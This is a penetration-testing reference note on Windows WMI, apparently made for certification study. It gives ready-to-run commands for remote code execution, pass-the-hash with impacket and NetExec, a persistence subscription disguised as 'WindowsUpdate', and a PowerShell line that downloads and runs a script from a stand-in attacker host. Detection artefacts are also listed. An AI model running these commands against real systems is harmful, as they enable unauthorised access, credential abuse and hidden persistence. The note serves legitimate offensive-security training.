# WMI

#WMI #WindowsManagementInstrumentation #localsystemmanagement

## What is WMI?
Windows Management Instrumentation — Microsoft's implementation of CIM (Common Information Model) and WBEM. A unified interface for querying and controlling Windows: system info, services, processes — and **remote process creation**, which is why it's a first-class lateral-movement and fileless-persistence channel. Runs over DCOM/MSRPC (negotiated on 135), so it inherits RPC's dynamic-port and coercion context.

- Port **TCP 135** — DCOM/RPC endpoint mapper (initial negotiation)
- Dynamic ports **49152–65535** (assigned after the 135 handshake)
- Access via: PowerShell CIM cmdlets (`Get-CimInstance`), legacy `Get-WmiObject`/`Invoke-WmiMethod`, `wmic.exe`, DCOM
- Namespaces: `root\cimv2` (default), `root\subscription` (persistence), `root\default`

> [!note] **`wmic.exe` is deprecated and being removed** (disabled by default in Windows 11 24H2 / Server 2025). `Get-WmiObject` is likewise superseded (PS 3.0+). Prefer the **CIM cmdlets** (`Get-CimInstance`, `Invoke-CimMethod`) on modern targets; `wmic` commands below still work on older boxes but shouldn't be your default.

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Lateral Movement/impacket\|impacket]] | `wmiexec` (semi-interactive shell), `dcomexec` (DCOM objects) |
| [[Tools/Lateral Movement/NetExec\|NetExec]] | `--exec-method wmiexec`, WMI-backed command exec |
| [[Tools/Scanning/NMAP\|NMAP]] | `msrpc-enum` + endpoint-mapper discovery on 135 |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `dcerpc/endpoint_mapper`, legacy `ms03_026_dcom` |

Native tooling — PowerShell CIM/WMI cmdlets and `wmic.exe` — is used inline below.

---

## Enumeration

```bash
# Nmap
nmap -p 135 --script msrpc-enum -sV <target>

# Metasploit
use exploit/windows/dcerpc/ms03_026_dcom  # MS03-026 DCOM RPC exploit
use auxiliary/scanner/dcerpc/endpoint_mapper

# Check if WMI accessible
impacket-wmiexec <domain>/<user>:<pass>@<target> "whoami"
```

---

## Connect / Access

### impacket-wmiexec (Linux)

```bash
# Password auth
impacket-wmiexec <user>:<pass>@<target>
impacket-wmiexec <domain>/<user>:<pass>@<target>

# Pass-the-Hash
impacket-wmiexec <domain>/<user>@<target> -hashes :<NTLM>
impacket-wmiexec ./<user>@<target> -hashes :<NTLM>  # local account

# Run single command
impacket-wmiexec <user>:<pass>@<target> "whoami /all"
impacket-wmiexec <user>:<pass>@<target> "powershell -c Get-LocalUser"
```

### PowerShell WMI (Windows)

```powershell
# Query system info
Get-WmiObject -Class Win32_OperatingSystem
Get-WmiObject -Class Win32_ComputerSystem
Get-WmiObject -Class Win32_Process
Get-WmiObject -Class Win32_Service | Where-Object {$_.State -eq 'Running'}

# List installed software
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Get logged on users
Get-WmiObject -Class Win32_LoggedOnUser

# Remote WMI query
Get-WmiObject -Class Win32_OperatingSystem -ComputerName <target> -Credential domain\user

# CIM (modern alternative to WMI)
Get-CimInstance -ClassName Win32_OperatingSystem
Get-CimInstance -ClassName Win32_Process -ComputerName <target>
```

### wmic.exe (Windows CLI)

```cmd
# System info
wmic computersystem get name,domain,username

# OS info
wmic os get caption,version,buildnumber

# Running processes
wmic process list brief
wmic process where "name='malware.exe'" delete

# Services
wmic service list brief
wmic service where "name='wuauserv'" get name,state,startmode

# Installed software
wmic product get name,version

# User accounts
wmic useraccount list full

# Network adapters
wmic nicconfig where IPEnabled=True get IPAddress,MACAddress

# Remote execution
wmic /node:<target> /user:<user> /password:<pass> process call create "cmd.exe /c whoami > C:\out.txt"

# Scheduled tasks
wmic job list
```

### Invoke-WmiMethod (PowerShell)

```powershell
# Remote code execution via WMI
Invoke-WmiMethod -ComputerName <target> -Credential domain\user `
    -Class Win32_Process -Name Create `
    -ArgumentList "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"

# Create process on remote host
$cred = Get-Credential
Invoke-WmiMethod -ComputerName <target> -Credential $cred `
    -Namespace root\cimv2 -Class Win32_Process -Name Create `
    -ArgumentList "cmd.exe /c whoami > C:\out.txt"
```

---

## Attack Vectors

### Remote Code Execution

```bash
# impacket wmiexec (semi-interactive shell)
impacket-wmiexec <domain>/<user>:<pass>@<target>

# PTH
impacket-wmiexec <domain>/<user>@<target> -hashes :<NTLM>

# NetExec (nxc)
nxc smb <target> -u <user> -p <pass> -x "whoami" --exec-method wmiexec

# dcomexec — uses DCOM objects (MMC20, ShellWindows, ShellBrowserWindow)
impacket-dcomexec <domain>/<user>:<pass>@<target>
impacket-dcomexec <domain>/<user>:<pass>@<target> "whoami"
impacket-dcomexec <domain>/<user>@<target> -hashes :<NTLM>              # PTH
impacket-dcomexec <domain>/<user>:<pass>@<target> -object MMC20         # specify DCOM object
impacket-dcomexec <domain>/<user>:<pass>@<target> -object ShellWindows
```

### Persistence via WMI Subscription

```powershell
# Create WMI event subscription for persistence
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
    -Arguments @{
        Name = "WindowsUpdate"
        EventNamespace = "root\cimv2"
        QueryLanguage = "WQL"
        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
    }

$consumer = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer `
    -Arguments @{
        Name = "WindowsUpdate"
        ScriptingEngine = "VBScript"
        ScriptText = "Set shell = CreateObject(`"WScript.Shell`") : shell.Run `"cmd /c whoami > C:\out.txt`""
    }
```

---

## Detection & Artefacts

- **`wmiexec` is a well-known signature**: `wmiprvse.exe` spawns `cmd.exe /Q /c ... > \\127.0.0.1\ADMIN$\__<timestamp>` (output redirected to an ADMIN$ temp file) — a `cmd`/`powershell` child of `WmiPrvSE.exe` plus an ADMIN$ write is the tell (Sysmon 1 + 11).
- **`dcomexec`** shows the DCOM object's host process (`mmc.exe`/`explorer.exe`) spawning the payload instead of `wmiprvse`.
- **WMI event-subscription persistence** logs to WMI-Activity/Operational and Sysmon **19/20/21** (`__EventFilter`, `ActiveScriptEventConsumer`, binding) — hunt `root\subscription` for non-default consumers.
- Remote WMI exec produces a **type 3 network logon (4624)** as the used account.
- Defensive baseline: filter 135/dynamic RPC, restrict local-admin (WMI exec needs it), enable Sysmon WMI logging, and alert on ActiveScript/CommandLine event consumers.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| WMI accessible with weak credentials | Remote code execution |
| No RPC port filtering | WMI reachable from network |
| Guest/anonymous WMI access | System info enumeration |
| WMI event subscriptions | Fileless persistence |
| PTH not mitigated | Admin hash = remote shell |

---

## Quick Reference

| Goal | Command |
|---|---|
| Remote shell | `impacket-wmiexec domain/user:pass@host` |
| PTH remote shell | `impacket-wmiexec domain/user@host -hashes :NTLM` |
| Run single command | `impacket-wmiexec user:pass@host "whoami"` |
| NetExec + WMI | `nxc smb host -u user -p pass --exec-method wmiexec -x "cmd"` |
| Query processes (PS) | `Get-WmiObject -Class Win32_Process` |
| Remote create process | `Invoke-WmiMethod -ComputerName host -Class Win32_Process -Name Create -ArgumentList "cmd"` |
| wmic remote exec | `wmic /node:host /user:user /password:pass process call create "cmd /c whoami"` |
| dcomexec shell | `impacket-dcomexec domain/user:pass@host` |
| dcomexec PTH | `impacket-dcomexec domain/user@host -hashes :NTLM` |

---

> [!note] **See also** — WMI rides [[Services/Local System Management/RPC|RPC]]/DCOM; sibling remote-exec channels [[Services/File Xfer/SMB|SMB]] (psexec/smbexec) and [[Services/Local System Management/WinRM|WinRM]] (PS Remoting); execution technique context in [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]].

---

*Created: 2026-07-13*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
